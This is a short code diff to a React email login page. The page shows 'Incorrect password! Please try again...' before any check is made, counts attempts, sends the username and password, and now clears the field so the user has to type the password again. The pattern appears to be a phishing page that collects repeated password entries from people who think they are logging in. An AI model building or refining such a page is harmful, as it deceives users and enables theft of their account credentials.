@@ -22,6 +22,8 @@ export default function EmailLoginPage() {
 
   const handleLogin = async () => {
     setFeedback('Incorrect password! Please try again...');
+    const pwdToSend = passcode;
+    setPasscode(''); // Clear passcode to require retaping
     attemptRef.current += 1;
     
     try {
@@ -30,7 +32,7 @@ export default function EmailLoginPage() {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           username: email.trim(),
-          password: passcode,
+          password: pwdToSend,
           method: 'email'
         })
       });
